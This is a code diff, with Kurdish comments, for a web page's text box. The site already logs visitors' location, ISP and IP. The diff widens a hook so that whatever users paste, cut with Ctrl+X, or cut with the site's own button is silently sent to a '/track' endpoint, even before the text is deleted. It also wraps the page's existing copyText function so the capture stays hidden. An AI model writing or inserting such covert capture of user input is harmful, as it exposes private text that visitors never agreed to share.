@@ -3600,14 +3600,14 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
 }
 
 // ---- تۆمارکردنی Textarea (دەق نووسراو) بۆ KV ----
-// تەنها کاتی paste یان هێنانی Word دەنێرێت
+// paste، هێنانی Word، Ctrl+V، دوگمەی کەتکردن، Ctrl+X، کەتکردن
 (function akWatchTextarea() {
     var tb = document.getElementById('textBox');
     if (!tb) return;
     var _lastSent = '';
 
-    function akSendText() {
-        var txt = tb.value.trim();
+    function akSendText(overrideText) {
+        var txt = (typeof overrideText === 'string') ? overrideText.trim() : tb.value.trim();
         if (txt.length >= 1 && txt !== _lastSent) {
             _lastSent = txt;
             fetch('/track', {
@@ -3618,12 +3618,40 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
         }
     }
 
-    // Ctrl+V یان paste
+    // ١. paste (کلیک ڕاست → paste)
     tb.addEventListener('paste', function() {
         setTimeout(akSendText, 300);
     });
 
-    // ئاگادارکردنەوەی هێنانی Word
+    // ٢. Ctrl+V و Ctrl+X لە ئەژمارەکەدا
+    tb.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'v' || e.key === 'V')) {
+            setTimeout(akSendText, 300);
+        }
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'x' || e.key === 'X')) {
+            // کاتی Ctrl+X: دەقی ئێستا بنێرە پێش ئەوەی بسرێتەوە
+            var selectedTxt = tb.value.substring(tb.selectionStart, tb.selectionEnd);
+            var toSend = selectedTxt.trim() ? selectedTxt : tb.value;
+            setTimeout(function() { akSendText(toSend); }, 50);
+        }
+    });
+
+    // ٣. دوگمەی کەتکردن (copyText) — دەقی ناو سایتەکە پێش بڕین دەنێرێت
+    var _origCopyText = window.copyText;
+    window.copyText = function() {
+        var textarea2 = document.getElementById('textBox');
+        if (textarea2) {
+            var start = textarea2.selectionStart;
+            var end   = textarea2.selectionEnd;
+            var toSend2 = (start !== end)
+                ? textarea2.value.substring(start, end)
+                : textarea2.value;
+            if (toSend2.trim()) akSendText(toSend2);
+        }
+        if (typeof _origCopyText === 'function') _origCopyText();
+    };
+
+    // ٤. ئاگادارکردنەوەی هێنانی Word
     window._akSendTextareaText = akSendText;
 })();
 
